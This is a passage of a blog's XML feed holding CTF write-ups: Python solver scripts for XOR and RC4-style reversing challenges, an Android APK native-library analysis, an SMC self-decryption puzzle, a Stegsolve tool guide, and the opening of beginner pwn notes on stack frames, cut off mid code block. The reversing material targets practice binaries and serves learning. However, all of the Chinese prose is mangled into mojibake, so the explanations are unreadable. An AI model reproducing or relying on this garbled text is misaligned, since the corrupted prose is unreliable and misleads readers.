src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153208.png" alt="image-20210114160105872"></p><p>è¿™å°±æ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²ä¸â€V7D=^,M.Eâ€è¿›è¡Œå¼‚æˆ–ï¼Œè‹¥è¾“å…¥çš„å­—ç¬¦ä¸²è¿˜æœ‰å‰©ï¼Œâ€V7D=^,M.Eâ€å°±ä»å¤´å¼€å§‹å¼‚æˆ–ï¼Œç»“æœå­˜åˆ°äº†v13ä¸­</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153212.png" alt="image-20210114160559677"></p><p>æ¥ç€å°†v29æ•°æ®åˆå§‹åŒ–ï¼Œå°†v28èµ‹å€¼â€I_am_the_keyâ€ï¼Œv17å­˜ç€v28çš„é•¿åº¦(12)ï¼Œæ¥ç€è¿›å…¥initå‡½æ•°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153214.png" alt="image-20210114160916846"></p><p>ç®€å•ç®—æ³•ï¼Œå†™ä¸ªè„šæœ¬å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a1 = []</span><br><span class="line">a2 = <span class="string">&quot;I_am_the_key&quot;</span></span><br><span class="line">v11 = <span class="string">&quot;&quot;</span></span><br><span class="line">a3 = <span class="built_in">len</span>(a2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    a1.append(i)</span><br><span class="line">    v11 = v11 + a2[i%a3]</span><br><span class="line">v7 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v9 = a1[i]</span><br><span class="line">    v7 = (v7 + v9 + <span class="built_in">ord</span>(v11[i])) % <span class="number">256</span></span><br><span class="line">    a1[i] = a1[v7]</span><br><span class="line">    a1[v7] = v9</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;:d&#125;&quot;</span>.<span class="built_in">format</span>(a1[i]),end = <span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°key</p><p>æ¥ç€çœ‹idaå‘ç°åŠ å¯†å‡½æ•°</p><p>v29ç°åœ¨æ˜¯keyï¼Œv13æ˜¯å¼‚æˆ–åçš„å­—ç¬¦ä¸²ï¼Œv11æ˜¯å­—ç¬¦ä¸²çš„é•¿åº¦</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153220.png" alt="image-20210114162655203"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153221.png" alt="image-20210114162839087"></p><p>åˆæ˜¯ä¸€äº›å¼‚æˆ–æ“ä½œï¼Œè¿”å›çœ‹çœ‹åŠ å¯†ä¹‹ååšäº†ä»€ä¹ˆ</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153224.png" alt="image-20210114163143450"></p><p>å°†åŠ å¯†åçš„æ•°æ®è½¬æˆ16è¿›åˆ¶ï¼Œåœ¨ä¸compareå­—ç¬¦ä¸²æ¯”è¾ƒä¸€æ ·å°±æ­£ç¡®ï¼Œç‚¹å¼€compare</p><p>å¾—åˆ°C8E4EF0E4DCCA683088134F8635E970EEAD9E27</p><p>è¿™å°±æ˜¯æœ€ç»ˆåŠ å¯†åçš„16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œé‚£æˆ‘ä»¬ç›´æ¥é€†æ¨å›å»å°±å¥½äº†ï¼Œä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">result = [<span class="number">0x39</span>,<span class="number">0xa9</span>,<span class="number">0x72</span>,<span class="number">0x2d</span>,<span class="number">0xe8</span>,<span class="number">0x58</span>,<span class="number">0x26</span>,<span class="number">0x32</span>,<span class="number">0x81</span>,<span class="number">0xd</span>,<span class="number">0xac</span>,<span class="number">0x49</span>,<span class="number">0xbb</span>,<span class="number">0x10</span>,<span class="number">0x46</span>,<span class="number">0x65</span>,<span class="number">0xb3</span>,<span class="number">0x92</span>,<span class="number">0xf</span>,<span class="number">0x84</span>,<span class="number">0xb8</span>,<span class="number">0xbf</span>,<span class="number">0xf2</span>,<span class="number">0x52</span>,<span class="number">0xe3</span>,<span class="number">0x5b</span>,<span class="number">0xfc</span>,<span class="number">0xd5</span>,<span class="number">0x59</span>,<span class="number">0x6a</span>,<span class="number">0xf0</span>,<span class="number">0x5d</span>,<span class="number">0x60</span>,<span class="number">0x69</span>,<span class="number">0x16</span>,<span class="number">0x8e</span>,<span class="number">0xfb</span>,<span class="number">0x94</span>,<span class="number">0x48</span>,<span class="number">0xbc</span>,<span class="number">0x71</span>,<span class="number">0x36</span>,<span class="number">0x57</span>,<span class="number">0xad</span>,<span class="number">0x44</span>,<span class="number">0x7c</span>,<span class="number">0x95</span>,<span class="number">0xda</span>,<span class="number">0xb7</span>,<span class="number">0x47</span>,<span class="number">0xdb</span>,<span class="number">0x35</span>,<span class="number">0x3c</span>,<span class="number">0xd2</span>,<span class="number">0x23</span>,<span class="number">0xc5</span>,<span class="number">0xa8</span>,<span class="number">0xb</span>,<span class="number">0x9f</span>,<span class="number">0x31</span>,<span class="number">0xd8</span>,<span class="number">0x1f</span>,<span class="number">0x3f</span>,<span class="number">0xb0</span>,<span class="number">0x2e</span>,<span class="number">0xe1</span>,<span class="number">0x5a</span>,<span class="number">0x4a</span>,<span class="number">0xf9</span>,<span class="number">0x1</span>,<span class="number">0x54</span>,<span class="number">0xa7</span>,<span class="number">0xa5</span>,<span class="number">0xee</span>,<span class="number">0x8</span>,<span class="number">0x99</span>,<span class="number">0x63</span>,<span class="number">0x9b</span>,<span class="number">0x50</span>,<span class="number">0xbd</span>,<span class="number">0x5</span>,<span class="number">0xf7</span>,<span class="number">0xcb</span>,<span class="number">0xab</span>,<span class="number">0x22</span>,<span class="number">0xc2</span>,<span class="number">0x8a</span>,<span class="number">0x38</span>,<span class="number">0x7d</span>,<span class="number">0x6</span>,<span class="number">0xb1</span>,<span class="number">0xc0</span>,<span class="number">0x4e</span>,<span class="number">0x74</span>,<span class="number">0x3a</span>,<span class="number">0xe5</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xa3</span>,<span class="number">0x73</span>,<span class="number">0x89</span>,<span class="number">0x9e</span>,<span class="number">0xba</span>,<span class="number">0x88</span>,<span class="number">0x3d</span>,<span class="number">0x28</span>,<span class="number">0x62</span>,<span class="number">0x8f</span>,<span class="number">0xfd</span>,<span class="number">0x43</span>,<span class="number">0x98</span>,<span class="number">0x4d</span>,<span class="number">0x56</span>,<span class="number">0xb2</span>,<span class="number">0xc</span>,<span class="number">0x29</span>,<span class="number">0x6e</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0xe0</span>,<span class="number">0xe9</span>,<span class="number">0xf6</span>,<span class="number">0x9c</span>,<span class="number">0x13</span>,<span class="number">0xed</span>,<span class="number">0xf8</span>,<span class="number">0xc4</span>,<span class="number">0x20</span>,<span class="number">0x87</span>,<span class="number">0x2</span>,<span class="number">0x7b</span>,<span class="number">0xf1</span>,<span class="number">0x6d</span>,<span class="number">0xc7</span>,<span class="number">0x8c</span>,<span class="number">0x9d</span>,<span class="number">0x86</span>,<span class="number">0x3b</span>,<span class="number">0x66</span>,<span class="number">0xfa</span>,<span class="number">0xb6</span>,<span class="number">0x42</span>,<span class="number">0x6f</span>,<span class="number">0x14</span>,<span class="number">0xd0</span>,<span class="number">0x19</span>,<span class="number">0xaf</span>,<span class="number">0x11</span>,<span class="number">0x21</span>,<span class="number">0x96</span>,<span class="number">0x85</span>,<span class="number">0x91</span>,<span class="number">0xb5</span>,<span class="number">0xa0</span>,<span class="number">0x1b</span>,<span class="number">0x18</span>,<span class="number">0xa6</span>,<span class="number">0xa2</span>,<span class="number">0x4b</span>,<span class="number">0x40</span>,<span class="number">0xd4</span>,<span class="number">0x8d</span>,<span class="number">0x2a</span>,<span class="number">0x8b</span>,<span class="number">0x5c</span>,<span class="number">0x2c</span>,<span class="number">0xe6</span>,<span class="number">0xfe</span>,<span class="number">0xa4</span>,<span class="number">0x30</span>,<span class="number">0xe7</span>,<span class="number">0xff</span>,<span class="number">0xc8</span>,<span class="number">0x5f</span>,<span class="number">0xe2</span>,<span class="number">0x1c</span>,<span class="number">0xdf</span>,<span class="number">0xae</span>,<span class="number">0x7f</span>,<span class="number">0xc3</span>,<span class="number">0x61</span>,<span class="number">0xef</span>,<span class="number">0x90</span>,<span class="number">0x6c</span>,<span class="number">0x51</span>,<span class="number">0x2f</span>,<span class="number">0xec</span>,<span class="number">0x12</span>,<span class="number">0x7a</span>,<span class="number">0xaa</span>,<span class="number">0xdd</span>,<span class="number">0x77</span>,<span class="number">0xf5</span>,<span class="number">0x4</span>,<span class="number">0xd9</span>,<span class="number">0x83</span>,<span class="number">0x33</span>,<span class="number">0xeb</span>,<span class="number">0x80</span>,<span class="number">0x27</span>,<span class="number">0x3</span>,<span class="number">0xb4</span>,<span class="number">0x9</span>,<span class="number">0x37</span>,<span class="number">0x6b</span>,<span class="number">0x41</span>,<span class="number">0x4f</span>,<span class="number">0x7e</span>,<span class="number">0xf3</span>,<span class="number">0x24</span>,<span class="number">0xf4</span>,<span class="number">0xc9</span>,<span class="number">0x7</span>,<span class="number">0xd1</span>,<span class="number">0x45</span>,<span class="number">0x70</span>,<span class="number">0xa1</span>,<span class="number">0xd7</span>,<span class="number">0x34</span>,<span class="number">0x93</span>,<span class="number">0x15</span>,<span class="number">0xca</span>,<span class="number">0x4c</span>,<span class="number">0xcd</span>,<span class="number">0x97</span>,<span class="number">0xb9</span>,<span class="number">0xea</span>,<span class="number">0x0</span>,<span class="number">0x5e</span>,<span class="number">0x1a</span>,<span class="number">0x9a</span>,<span class="number">0xcf</span>,<span class="number">0x79</span>,<span class="number">0xa</span>,<span class="number">0x3e</span>,<span class="number">0x82</span>,<span class="number">0xd3</span>,<span class="number">0x68</span>,<span class="number">0x75</span>,<span class="number">0x64</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0xe</span>,<span class="number">0xbe</span>,<span class="number">0x1d</span>,<span class="number">0xe4</span>,<span class="number">0xc1</span>,<span class="number">0xc6</span>,<span class="number">0xde</span>,<span class="number">0xcc</span>,<span class="number">0x1e</span>,<span class="number">0x17</span>,<span class="number">0xd6</span>,<span class="number">0xdc</span>,<span class="number">0x53</span>,<span class="number">0x76</span>]</span><br><span class="line">a2= [<span class="number">0xC8</span>,<span class="number">0xE4</span>,<span class="number">0xEF</span>,<span class="number">0x0E</span>,<span class="number">0x4D</span>,<span class="number">0xCC</span>,<span class="number">0xA6</span>,<span class="number">0x83</span>,<span class="number">0x08</span>,<span class="number">0x81</span>,<span class="number">0x34</span>,<span class="number">0xF8</span>,<span class="number">0x63</span>,<span class="number">0x5E</span>,<span class="number">0x97</span>,<span class="number">0x0E</span>,<span class="number">0xEA</span>,<span class="number">0xD9</span>,<span class="number">0xE2</span>,<span class="number">0x77</span>,<span class="number">0xF3</span>,<span class="number">0x14</span>,<span class="number">0x86</span>,<span class="number">0x9F</span>,<span class="number">0x7E</span>,<span class="number">0xF5</span>,<span class="number">0x19</span>,<span class="number">0x8A</span>,<span class="number">0x2A</span>,<span class="number">0xA4</span>]</span><br><span class="line">a3 = <span class="built_in">len</span>(a2)</span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line">v4 = <span class="number">0</span></span><br><span class="line">v5 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a3):</span><br><span class="line">    v3 = (v3 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    v5 = result[v3]</span><br><span class="line">    v4 = (v5 + v4) % <span class="number">256</span></span><br><span class="line">    result[v3] = result[v4]</span><br><span class="line">    result[v4] = v5</span><br><span class="line">    a2[i] = a2[i]^(result[(result[v3]+v5)%<span class="number">256</span>])</span><br><span class="line">ss=<span class="string">&quot;V7D=^,M.E&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a3):</span><br><span class="line">    j=i%<span class="number">9</span></span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(ss[j])^a2[i])</span><br><span class="line">    j=j+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»“æœä¸ºIt_s_a_easyCrack_for_beginners</p><h1 id="fake-func"><a href="#fake-func" class="headerlink" title="fake-func"></a>fake-func</h1><p>apkæ–‡ä»¶ï¼Œç”¨Android Killerç›´æ¥å¤„ç†ï¼Œçœ‹javaå±‚</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153242.png" alt="image-20210114171341081"></p><p>å‘ç°åˆ¤æ–­ä½¿ç”¨checkæ¨¡å—çš„checkflag</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153245.png" alt="image-20210114171458751"></p><p>è¿™é‡Œç”¨äº†nativeå±‚å‡½æ•°</p><p>ç›´æ¥åˆ°soé‡Œçœ‹çœ‹</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153249.png" alt="image-20210114202052958"></p><p>å°†è¾“å…¥çš„å­—ç¬¦ä¸²ä¼ åˆ°v3</p><p>è¿›å…¥sub_E08å‡½æ•°åä¸off_6004å­—ç¬¦ä¸²ï¼ˆâ€c2RuaXNjc2RuaXNjYWJjZA==â€ï¼‰æ¯”è¾ƒ</p><p>çœ‹çœ‹sub_E08å‡½æ•°çœ‹çœ‹</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153251.png" alt="image-20210114202244300"></p><p>å°†off_6004å­—ç¬¦ä¸²èµ‹å€¼ç»™v0ï¼Œåœ¨å°†v1å­˜å…¥off_6004å­—ç¬¦ä¸²çš„é•¿åº¦</p><p>æ¥ç€çœ‹sub_16D8å‡½æ•°ï¼Œå‘ç°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153254.png" alt="image-20210114202900334"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153257.png" alt="image-20210114202907213"></p><p>å¯çŸ¥æ˜¯base64è§£å¯†</p><p>å°†å­—ç¬¦ä¸²è§£å¯†å¾—åˆ°æ–°çš„å­—ç¬¦ä¸²â€sdniscsdniscabcdâ€</p><p>å¯¹ sub_E08()å‡½æ•°æŒ‰Xçœ‹çœ‹è¿˜æœ‰è°è°ƒç”¨è¿‡</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153300.png" alt="image-20210114203331086"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153303.png" alt="image-20210114203338870"></p><p>æ‹¿åˆ°â€K4/7/faihmk9/WEMlfuFdpgrP86ckd4oQQ/UeAiZdx8=â€</p><p>åœ¨çœ‹çœ‹sub_1388å‡½æ•°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153305.png" alt="image-20210114203925707"></p><p>åœ¨çœ‹çœ‹sub_F24å‡½æ•°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153444.png" alt="image-20210114211803202"></p><p>byte_4255</p><p>æŸ¥çœ‹å‘ç°256ä¸ª</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153308.png" alt="image-20210114211920391"></p><p>åŠ å¯†çš„æ–‡æœ¬ç»“å°¾æœ‰ä¸€ä¸ªç­‰å·ï¼Œåˆä¸æ˜¯baseï¼Œæ€€ç–‘æ˜¯AESï¼Œç›´æ¥çˆ†ç ´</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153310.png" alt="image-20210114212619342"></p><p>flag{fake_func_3nfxvs}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;easyeasy-200&quot;&gt;&lt;a href=&quot;#easyeasy-200&quot; class=&quot;headerlink&quot; title=&quot;easyeasy-200&quot;&gt;&lt;/a&gt;easyeasy-200&lt;/h1&gt;&lt;p&gt;å®‰å“é€†å‘&lt;/p&gt;
&lt;p&gt;ç”¨Android Killerç›´æ¥å</summary>
      
    
    
    
    <category term="reverse ctf" scheme="http://example.com/categories/reverse-ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>Stegsolveä½¿ç”¨ä»‹ç»</title>
    <link href="http://example.com/2021/08/13/Stegsolve%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2021/08/13/Stegsolve%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</id>
    <published>2021-08-13T11:39:43.650Z</published>
    <updated>2021-08-13T07:53:37.775Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Stegsolveä½¿ç”¨ä»‹ç»"><a href="#Stegsolveä½¿ç”¨ä»‹ç»" class="headerlink" title="Stegsolveä½¿ç”¨ä»‹ç»"></a>Stegsolveä½¿ç”¨ä»‹ç»</h1><p>ctf miscæ–¹å‘éš¾å…ä¼šé‡åˆ°éœ€è¦å¤„ç†å›¾ç‰‡çš„é—®é¢˜</p><p>è€Œä¸€å¼€å§‹æˆ‘éƒ½ç”¨psï¼Œé‚£ç©æ„å¤ªå¤§äº†ï¼Œè€ŒStegsolveç”¨èµ·æ¥å¾ˆæ–¹ä¾¿ï¼Œæ‰€ä»¥åœ¨è¿™è®°å½•ä¸€ä¸‹ä½¿ç”¨æ–¹æ³•ä»€ä¹ˆçš„</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108101130987.png" alt="image-20210810113033872"></p><p>Open æ‰“å¼€æ–‡ä»¶</p><p>Save As ä¿å­˜æ–‡ä»¶</p><p>Exit é€€å‡º</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108101131223.png" alt="image-20210810113110173"></p><h2 id="File-Format"><a href="#File-Format" class="headerlink" title="File Format"></a>File Format</h2><p>æŸ¥çœ‹æ–‡ä»¶æ ¼å¼</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108101132798.png" alt="image-20210810113253737"></p><p>æœ‰å¯èƒ½åœ¨è¿™é‡Œæ‰¾åˆ°flag</p><h2 id="Data-Extract"><a href="#Data-Extract" class="headerlink" title="Data Extract"></a>Data Extract</h2><p>æ•°æ®æå–</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108101134228.png" alt="image-20210810113427164"></p><h3 id="Bit-Planeséƒ¨åˆ†"><a href="#Bit-Planeséƒ¨åˆ†" class="headerlink" title="Bit Planeséƒ¨åˆ†"></a>Bit Planeséƒ¨åˆ†</h3><p>Alphaæ˜¯é€æ˜åº¦</p><p>Red Green Blueæ˜¯çº¢ç»¿è“ æ•°å­—è¶Šå¤§è¯¥é¢œè‰²çš„äº®åº¦è¶Šé«˜ï¼Œæ•°å­—è¶Šå°è¯¥é¢œè‰²çš„äº®åº¦è¶Šä½</p><p>äº®åº¦çº§åˆ«ä¸º256ä¸ªçº§åˆ« 2^8 7~0</p><h3 id="Order-settings"><a href="#Order-settings" class="headerlink" title="Order settings"></a>Order settings</h3><p><strong>Extract By</strong></p><p>é¢å¤–çš„</p><p>Row è¡Œ</p><p>Column çºµ</p><p>åƒç´ ä½¿ç”¨RGB(0-255,0-255,0-255)è¡¨ç¤º</p><p><strong>Bit Order</strong></p><p>ä½é¡ºåº</p><p>MSB First  ä¸€ä¸²çš„æœ€é«˜ä½</p><p>LSB First ä¸€ä¸²ä¸ºæœ€ä½ä½</p><p><strong>Bit Plane Order</strong></p><p>ä½å¹³é¢é¡ºåº</p><p>RGBçš„é¡ºåº</p><h2 id="Steregram-Solve"><a href="#Steregram-Solve" class="headerlink" title="Steregram Solve"></a>Steregram Solve</h2><p>ç«‹ä½“è¯•å›¾ï¼Œ å·¦å³æ§åˆ¶åç§» </p><h2 id="Frame-Browser"><a href="#Frame-Browser" class="headerlink" title="Frame Browser"></a>Frame Browser</h2><p>æŒ‰å¸§æµè§ˆï¼Œå¯ä»¥çœ‹GIFçš„åŠ¨å›¾ï¼Œåƒbuuctfçš„é‡‘ä¸‰èƒ–é‚£é¢˜å°±æ˜¯è—å¸§é‡Œ</p><h2 id="Image-Combiner"><a href="#Image-Combiner" class="headerlink" title="Image Combiner"></a>Image Combiner</h2><p>æ‹¼å›¾</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Stegsolveä½¿ç”¨ä»‹ç»&quot;&gt;&lt;a href=&quot;#Stegsolveä½¿ç”¨ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;Stegsolveä½¿ç”¨ä»‹ç»&quot;&gt;&lt;/a&gt;Stegsolveä½¿ç”¨ä»‹ç»&lt;/h1&gt;&lt;p&gt;ctf miscæ–¹å‘éš¾å…ä¼šé‡åˆ°éœ€è¦å¤„ç†å›¾ç‰‡çš„é—®é¢˜&lt;/</summary>
      
    
    
    
    <category term="misc" scheme="http://example.com/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>smcè‡ªè§£å¯†</title>
    <link href="http://example.com/2021/08/13/smc%E8%87%AA%E8%A7%A3%E5%AF%86/"/>
    <id>http://example.com/2021/08/13/smc%E8%87%AA%E8%A7%A3%E5%AF%86/</id>
    <published>2021-08-13T11:39:43.647Z</published>
    <updated>2021-08-13T07:50:43.378Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BABYRE"><a href="#BABYRE" class="headerlink" title="BABYRE"></a>BABYRE</h1><p>idaæ‰“å¼€åçœ‹ä¸»å‡½æ•°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153506.png" alt="image-20210125124251306"></p><p>å¾—çŸ¥å…ˆå°†judgeæ•°ç»„é‡Œå¤´çš„æ•°æ®è¿›è¡Œäº†å¼‚æˆ–ï¼Œç‚¹å¼€çœ‹çœ‹</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153509.png" alt="image-20210125172059446"></p><p>åé¢çœ‹judgeæ˜¯ä¸€ä¸ªå‡½æ•°æ‰å¯¹</p><p>è¿™åº”è¯¥æ˜¯éœ€è¦idcæˆ–è€…æ˜¯pythonè„šæœ¬æ¥è®²æ•°æ®è¿›è¡Œä¸€äº›æ”¹å˜</p><p>è¿™é‡Œéœ€è¦ä¿®æ”¹ç¨‹åºä¸­åŸæœ‰çš„æ•°æ®</p><p><strong>smcè‡ªè§£å¯†</strong></p><table><thead><tr><th>è¿”å›å€¼</th><th>å‡½æ•°å</th><th>å‚æ•°</th><th>æ“ä½œ</th></tr></thead><tbody><tr><td>void</td><td>PatchByte</td><td>long addr, long val</td><td>è®¾ç½®è™šæ‹Ÿåœ°å€addrå¤„çš„ä¸€ä¸ªå­—èŠ‚å€¼</td></tr></tbody></table><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153512.png" alt="image-20210125175000268"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725153514.png" alt="image-20210125175358009"></p><p>å¾—åˆ°äº†åˆ¤æ–­å‡½æ•°å’Œæ¯”è¾ƒå­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x7f</span>,<span class="number">0x6b</span>,<span class="number">0x37</span>,<span class="number">0x64</span>,<span class="number">0x3b</span>,<span class="number">0x56</span>,<span class="number">0x60</span>,<span class="number">0x3b</span>,<span class="number">0x6e</span>,<span class="number">0x70</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(s[i]^i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>flag{n1c3_j0b}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BABYRE&quot;&gt;&lt;a href=&quot;#BABYRE&quot; class=&quot;headerlink&quot; title=&quot;BABYRE&quot;&gt;&lt;/a&gt;BABYRE&lt;/h1&gt;&lt;p&gt;idaæ‰“å¼€åçœ‹ä¸»å‡½æ•°&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://sunqiz.oss-cn-beij</summary>
      
    
    
    
    <category term="reverse ctf" scheme="http://example.com/categories/reverse-ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>pwnåˆå­¦ç¬”è®°</title>
    <link href="http://example.com/2021/08/13/pwn%E5%88%9D%E5%AD%A6%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2021/08/13/pwn%E5%88%9D%E5%AD%A6%E7%AC%94%E8%AE%B0/</id>
    <published>2021-08-13T11:39:43.645Z</published>
    <updated>2021-08-13T07:55:58.435Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwnåˆå­¦ç¬”è®°"><a href="#pwnåˆå­¦ç¬”è®°" class="headerlink" title="pwnåˆå­¦ç¬”è®°"></a>pwnåˆå­¦ç¬”è®°</h1><p>å¸ˆå‚…ä»¬çš„å­¦ä¹ åšå®¢ï¼š</p><p><a href="https://blog.csdn.net/qq_42880719/article/details/119187995?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_42880719/article/details/119187995?spm=1001.2014.3001.5501</a></p><p><a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p><p><a href="https://www.yuque.com/cyberangel">https://www.yuque.com/cyberangel</a></p><p><a href="https://www.yuque.com/hxfqg9/bin/zzg02e#62Pxt">https://www.yuque.com/hxfqg9/bin/zzg02e#62Pxt</a></p><p>é¶åœºï¼š<br><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a><br><a href="https://ctf.show/challenges">https://ctf.show/challenges</a><br><a href="https://pwnable.tw/challenge/">https://pwnable.tw/challenge/</a><br><a href="http://pwnable.kr/play.php">http://pwnable.kr/play.php</a><br><a href="https://bamboofox.cs.nctu.edu.tw/courses">https://bamboofox.cs.nctu.edu.tw/courses</a> </p><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><h3 id="æ±‡ç¼–çŸ¥è¯†"><a href="#æ±‡ç¼–çŸ¥è¯†" class="headerlink" title="æ±‡ç¼–çŸ¥è¯†"></a>æ±‡ç¼–çŸ¥è¯†</h3><p>ESPï¼šæ ˆæŒ‡é’ˆå¯„å­˜å™¨(extended stack pointer)ï¼Œå…¶å†…å­˜æ”¾ç€ä¸€ä¸ªæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢ä¸€ä¸ªæ ˆå¸§çš„æ ˆé¡¶ã€‚</p><p>EBPï¼šåŸºå€æŒ‡é’ˆå¯„å­˜å™¨(extended base pointer)ï¼Œå…¶å†…å­˜æ”¾ç€ä¸€ä¸ªæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢ä¸€ä¸ªæ ˆå¸§çš„åº•éƒ¨ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹Cå†™çš„ç¨‹åºéƒ½æ˜¯cdecl call</p><p>åœ¨å‡½æ•°è°ƒç”¨çš„æ—¶å€™ callå¯ä»¥çœ‹ä½œpop eip,jmp func</p><p>åœ¨å‡½æ•°å†…éƒ¨è¿˜æœ‰ä¸€ä¸ªpush ebp</p><p>æ‰€ä»¥åœ¨è¦†ç›–åˆ°æ ˆä¸Šä¿å­˜çš„retè¿”å›åœ°å€å‰è¿˜æœ‰ä¸€ä¸ªebp(rbp)éœ€è¦è¦†ç›– è¿™ä¸ªå°±æ˜¯å¤šå‡ºæ¥çš„4(8)ä¸ªå­—èŠ‚</p><p>espå§‹ç»ˆæŒ‡å‘æ ˆé¡¶ï¼Œebpæ˜¯åœ¨å †æ ˆä¸­å¯»å€ç”¨çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 